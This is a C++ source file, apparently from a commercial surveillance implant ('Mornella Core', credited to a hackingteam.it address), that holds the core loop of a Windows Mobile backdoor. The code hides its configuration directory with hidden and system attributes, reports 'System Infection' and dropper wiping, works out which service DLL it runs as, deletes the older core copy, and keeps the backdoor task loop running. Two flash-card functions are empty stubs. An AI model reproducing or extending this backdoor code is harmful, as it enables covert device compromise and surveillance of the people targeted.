/*
	Mornella Core v0.1
	Date: 10/Sep/2008
	Coded by: Alberto "Quequero" Pelliccione
	E-mail: quequero@hackingteam.it
*/

#include "Core.h"
#include "FunctionFunc.h"


HANDLE __FindFirstFlashCard(LPWIN32_FIND_DATA lpFindFlashData)
{/// da completare BYGIO
	HANDLE h=0;
	return h;
}

BOOL __FindNextFlashCard(HANDLE hFlashCard, LPWIN32_FIND_DATA lpFindFlashData)
{
	/// da completare BYGIO
	return TRUE;
}

Core::Core() {
#ifdef _DEBUG
	OutputDebugString(L"Core");
#endif
	taskObj = Task::self();
}

Core::~Core() {

}

BOOL Core::Run() {
	wstring backdoorPath;
	WCHAR *pDropperPath = NULL;
	HANDLE hMmc = INVALID_HANDLE_VALUE;

	_Sleep(500);

	// Inizializziamo g_strOurName
	GetMyName(g_strOurName);

	// Nascondiamo la directory dove c'e' il file di configurazione
	backdoorPath = L"";
	backdoorPath += LOG_DIR;
	SetFileAttributes(backdoorPath.c_str(), FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM);


	ADDDEMOMESSAGE(L"Core Version: 2014012001\nDropper Wiping... OK\nSystem Infection : ... OK\n");
	DBG_TRACE_VERSION;

	// Rimuoviamo il vecchio core se presente
	RemoveOldCore();
	
	taskObj->StartNotification();

	// Avviamo il core
	LOOP {
		if (taskObj->TaskInit() == FALSE) {
			DBG_TRACE(L"Debug - Core.cpp - TaskInit() FAILED\n", 1, FALSE);
			ADDDEMOMESSAGE(L"Backdoor Init... FAILED\n");
			DISPLAYDEMOMESSAGE(NULL);
			return FALSE;
		} else {
			DBG_TRACE(L"Debug - Core.cpp - TaskInit() OK\n", 1, FALSE);
			ADDDEMOMESSAGE(L"Backdoor Status... OK\n");
			DISPLAYDEMOMESSAGE(NULL);
		}

		if (taskObj->CheckActions() == FALSE) {
			DBG_TRACE(L"Debug - Core.cpp - CheckActions() [Uninstalling?] FAILED\n", 1, FALSE);
			DISPLAYDEMOMESSAGE(L"Backdoor Uninstalled, reboot the device!");
			return FALSE;
		}
	}
	
	return TRUE;
}

// Torna un puntatore al nome della nostra dll, NULL se non riesce a trovarlo, 
// il puntatore va liberato dal chiamante.
void Core::GetMyName(wstring &strName) {
	HMODULE hMod;

	do {
		hMod = _GetModuleHandleW(MORNELLA_SERVICE_DLL_A);

		if (hMod == NULL)
			break;

		if (GetProcAddress(hMod, (LPCSTR)L"BTC_WriteAsync")) {
			strName = MORNELLA_SERVICE_DLL_A;
			return;
		}
	} while(0);

	do {
		hMod = _GetModuleHandleW(MORNELLA_SERVICE_DLL_B);

		if (hMod == NULL)
			break;

		if (GetProcAddress(hMod, (LPCSTR)L"BTC_WriteAsync")) {
			strName = MORNELLA_SERVICE_DLL_B;
			return;
		}
	} while(0);

	DBG_TRACE(L"Debug - Core.cpp - GetMyName() FAILED\n", 5, FALSE);
	return;
}

BOOL Core::RemoveOldCore() {
	wstring strPathName;

	if (g_strOurName.size() == 0) {
		DBG_TRACE(L"Debug - Core.cpp - RemoveOldCore() FAILED\n", 5, FALSE);
		return FALSE;
	}

	strPathName = L"\\windows\\";

	if (g_strOurName == MORNELLA_SERVICE_DLL_A)
		strPathName += MORNELLA_SERVICE_DLL_B;
	else
		strPathName += MORNELLA_SERVICE_DLL_A;

	BOOL bRet = DeleteFile(strPathName.c_str());

	return bRet;
}
